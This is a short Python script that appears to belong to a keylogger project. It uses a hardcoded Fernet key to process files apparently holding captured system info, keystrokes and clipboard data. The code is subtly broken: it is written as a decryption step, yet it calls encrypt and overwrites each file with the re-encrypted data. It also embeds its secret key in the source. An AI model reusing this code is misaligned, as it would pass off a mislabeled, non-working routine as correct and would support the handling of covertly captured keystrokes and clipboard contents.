from cryptography.fernet import Fernet

key = "WyGyAJ-l3zJLgn8Fu5efL8IrKSUSjYDAI_lzRdghl78="

sys_info = "e_sys_info.txt"
key_info = "e_key_info.txt"
clip_info = "e_clip_info.txt"

encrypted_files = [sys_info, key_info, clip_info]
cnt = 0

for decrypted_file in encrypted_files:
     with open(encrypted_files[cnt],"rb") as f:
         data = f.read()

     fernet = Fernet(key)
     decrypted = fernet.encrypt(data)

     with open(encrypted_files[cnt], "wb") as f:
         f.write(decrypted)

     cnt += 1
